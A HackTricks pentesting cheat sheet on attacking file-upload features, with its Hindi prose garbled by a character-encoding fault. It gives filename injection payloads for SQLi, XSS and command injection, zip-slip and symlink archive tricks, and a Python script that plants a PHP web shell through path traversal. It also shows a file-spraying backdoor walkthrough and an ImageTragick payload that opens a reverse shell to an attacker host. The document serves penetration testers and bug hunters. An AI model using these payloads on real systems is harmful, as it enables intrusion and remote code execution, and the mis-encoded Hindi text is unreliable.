* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ Pentesters рдФрд░ Bug Hunters рдХреЛ рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдореИрдХреЗрдирд┐рдЬреНрдо рдХреА рдЬрд╛рдВрдЪ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рд╡рд┐рднрд┐рдиреНрди bug bounty рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд▓реНрдирд░реЗрдмрд┐рд▓рд┐рдЯреАрдЬ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рдЙрдирдХреЗ рд╢реЛрд╖рдг рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рддрд╛ рд╣реИ, рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЗ рдЧрд╣рди рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред

## рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рд╕реЗ рдЕрдиреНрдп рд╡рд▓реНрдирд░реЗрдмрд┐рд▓рд┐рдЯреАрдЬ рддрдХ

* **filename** рдХреЛ `../../../tmp/lol.png` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ **path traversal** рд╣рд╛рд╕рд┐рд▓ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ
* **filename** рдХреЛ `sleep(10)-- -.jpg` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдЖрдк **SQL injection** рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **filename** рдХреЛ `<svg onload=alert(document.domain)>` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ рддрд╛рдХрд┐ XSS рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд╕рдХреЗрдВ
* **filename** рдХреЛ `; sleep 10;` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХреБрдЫ command injection рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХреЗрдВ (рдЕрдзрд┐рдХ [command injections tricks here](../command-injection.md))
* [**XSS** in image (svg) file upload](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** file **upload** + **XSS** = [**Service Workers** рдХрд╛ рд╢реЛрд╖рдг](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) рд╕реЗ **рд╡рд┐рднрд┐рдиреНрди svg payloads** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ\*\*\*\*
* [рдкреНрд░рд╕рд┐рджреНрдз **ImageTrick** рд╡рд▓реНрдирд░реЗрдмрд┐рд▓рд┐рдЯреА](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* рдпрджрд┐ рдЖрдк **рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ URL рд╕реЗ рдЗрдореЗрдЬ рдХреИрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк [SSRF](../ssrf-server-side-request-forgery/) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдпрд╣ **рдЗрдореЗрдЬ** рдХрд┐рд╕реА **рдкрдмреНрд▓рд┐рдХ** рд╕рд╛рдЗрдЯ рдореЗрдВ **рд╕реЗрд╡** рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╣реИ, рддреЛ рдЖрдк [https://iplogger.org/invisible/](https://iplogger.org/invisible/) рд╕реЗ рдПрдХ URL рднреА рд╕рдВрдХреЗрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╣рд░ рд╡рд┐рдЬрд┐рдЯрд░ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
* [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
* XSS рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП PDFs: [рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрдЬ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ **PDF рдбреЗрдЯрд╛ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ JS рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](../xss-cross-site-scripting/pdf-injection.md)ред рдпрджрд┐ рдЖрдк PDFs рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рджрд┐рдП рдЧрдП рд╕рдВрдХреЗрддреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдордирдорд╛рдиреЗ JS рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреБрдЫ PDF рддреИрдпрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) рдХреА рд╕рд╛рдордЧреНрд░реА рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рдореЗрдВ рдХреЛрдИ **antivirus** рд╣реИ
* рдлрд╛рдЗрд▓реНрд╕ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдХреЛрдИ **size limit** рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ

рдпрд╣рд╛рдБ рдПрдХ рдЯреЙрдк 10 рд╕реВрдЪреА рд╣реИ рдЬрд┐рди рдЪреАрдЬреЛрдВ рдХреЛ рдЖрдк рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╕реНрд░реЛрдд [link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magic Header Bytes

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

рдЕрдиреНрдп рдлрд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рд▓рд┐рдП [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) рджреЗрдЦреЗрдВред

### Zip/Tar File Automatically decompressed Upload

рдпрджрд┐ рдЖрдк рдПрдХ ZIP рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ, рддреЛ рдЖрдк 2 рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

#### Symlink

рдЕрдиреНрдп рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рд╕реЙрдлреНрдЯ рд▓рд┐рдВрдХреНрд╕ рд╡рд╛рд▓рд╛ рдПрдХ рд▓рд┐рдВрдХ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдлрд┐рд░, рдбрд┐рдХрдВрдкреНрд░реЗрд╕реНрдб рдлрд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЖрдк рд▓рд┐рдВрдХ рдХреА рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪреЗрдВрдЧреЗ:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### рд╡рд┐рднрд┐рдиреНрди рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдореЗрдВ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХрд░реЗрдВ

рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдореЗрдВ рдмрдирд╛рдИ рдЬрд╛рдПрдВрдЧреАред

рдХреЛрдИ рдЖрд╕рд╛рдиреА рд╕реЗ рдорд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╕реЗрдЯрдЕрдк OS-рд╕реНрддрд░реАрдп рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рд╕реЗ рдмрдЪрд╛рддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢ рдпрд╣ рд╕рдЪ рдирд╣реАрдВ рд╣реИред рдЪреВрдВрдХрд┐ ZIP рдЖрд░реНрдХрд╛рдЗрд╡ рдкреНрд░рд╛рд░реВрдк рд╕рдВрд░рдЪрдирд╛рддреНрдордХ рд╕рдВрдкреАрдбрд╝рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╣рдо рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рднреА рд╕рдВрджрд░реНрдн рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо рд╕реБрд░рдХреНрд╖рд┐рдд рдЕрдкрд▓реЛрдб рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ рд▓рдХреНрд╖реНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреА рдбрд┐рдХрдВрдкреНрд░реЗрд╢рди рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдпрд╣рд╛рдБ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: [**https://github.com/ptoomey3/evilarc**](https://github.com/ptoomey3/evilarc)
```python
python2 evilarc.py -h
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
```markdown
рдЖрдк **symlink trick with evilarc** рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ flag `/flag.txt` рдореЗрдВ рд╣реИ рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдЙрд╕ рдлрд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП **symlink рдмрдирд╛рдПрдВ** рдФрд░ **рдЕрдкрдиреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╡рд╣ рдлрд╛рдЗрд▓ рдмрдирд╛рдПрдВ** рддрд╛рдХрд┐ рдЬрдм рдЖрдк evilarc рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ рддреЛ рдпрд╣ **error рди рдХрд░реЗ**ред

рдХреБрдЫ python рдХреЛрдб рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг zip рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:
```
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
```markdown
рджреВрд░рд╕реНрде рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рдЙрдард╛рдП:

1. рдПрдХ PHP рд╢реЗрд▓ рдмрдирд╛рдПрдВ:
```
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
1. "file spraying" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдПрдХ рд╕рдВрдХреБрдЪрд┐рдд zip рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ:
```
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3.рдПрдХ hexeditor рдпрд╛ vi рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ "xxA" рдХреЛ "../" рдореЗрдВ рдмрджрд▓реЗрдВ, рдореИрдВрдиреЗ vi рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛:
```
:set modifiable
:%s/xxA/..\//g
:x!
```
рдХреЗрд╡рд▓ рдПрдХ рдХрджрдо рд╢реЗрд╖ рдерд╛: ZIP рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЗрд╕реЗ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХрд░рдиреЗ рджреЗрдВ! рдпрджрд┐ рдпрд╣ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ рддреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдПрдХ рд╕рд░рд▓ OS рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рд╢реЗрд▓ рд╣реЛрдЧрд╛:

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**рд╕рдВрджрд░реНрдн**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## ImageTragic

рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рдЗрдореЗрдЬ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рддрд╛рдХрд┐ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ **(ImageMagick, 7.0.1-1)**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PHP Shell рдХреЛ PNG рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд░рдирд╛

IDAT рдЪрдВрдХ рдореЗрдВ рд╡реЗрдм рд╢реЗрд▓ рдбрд╛рд▓рдиреЗ рдХрд╛ рдореБрдЦреНрдп рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ resize рдФрд░ re-sampling рдСрдкрд░реЗрд╢рдиреНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИ - PHP-GD рдореЗрдВ рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреЛ рдлрдВрдХреНрд╢рдиреНрд╕ рд╣реИрдВ [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) рдФрд░ [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php)ред

рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ, Polyglots рдРрд╕реА рдлрд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдлрд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рд╣реЛрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, [GIFAR](https://en.wikipedia.org/wiki/Gifar) рдПрдХ GIF рдФрд░ RAR рдлрд╛рдЗрд▓ рджреЛрдиреЛрдВ рд╣реИред рдРрд╕реА рдлрд╛рдЗрд▓реЗрдВ рднреА рд╣реЛрддреА рд╣реИрдВ рдЬреЛ GIF рдФрд░ JS, PPT рдФрд░ JS рдЖрджрд┐ рджреЛрдиреЛрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

Polyglot рдлрд╛рдЗрд▓реЗрдВ рдЕрдХреНрд╕рд░ рдлрд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░реЛрдВ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЬрд╛рддреА рд╣реИрдВред рдХрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдлрд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдХреЗрд╡рд▓ рдХреБрдЫ рдкреНрд░рдХрд╛рд░ рдХреА рдЕрдкрд▓реЛрдбреНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ JPEG, GIF, DOC, рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ JS рдлрд╛рдЗрд▓реЗрдВ, PHP рдлрд╛рдЗрд▓реЗрдВ рдпрд╛ Phar рдлрд╛рдЗрд▓реЗрдВ рдЬреИрд╕реА рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЦрддрд░рдирд╛рдХ рдлрд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рди рдХрд░ рд╕рдХреЗрдВред

рдпрд╣ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреЗ рдЕрдиреБрд░реВрдк рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЖрдкрдХреЛ рдПрдХ PHAR рдлрд╛рдЗрд▓ (PHp ARchive) рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ JPEG рдХреА рддрд░рд╣ рднреА рджрд┐рдЦрддреА рд╣реИ, рд▓реЗрдХрд┐рди рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдЕрднреА рднреА рдПрдХ рдорд╛рдиреНрдп рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдФрд░ рдпрджрд┐ рдЕрдкрд▓реЛрдб рдлрдВрдХреНрд╢рди рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдЖрдкрдХреА рдорджрдж рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **bug bounty platform рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рд╣рдорд╕реЗ рдЬреБрдбрд╝реЗрдВ, рдФрд░ **$100,000** рддрдХ рдХреЗ bounties рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реБрд░реБрдЖрдд рд╕реЗ рд▓реЗрдХрд░ рдПрдХреНрд╕рдкрд░реНрдЯ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
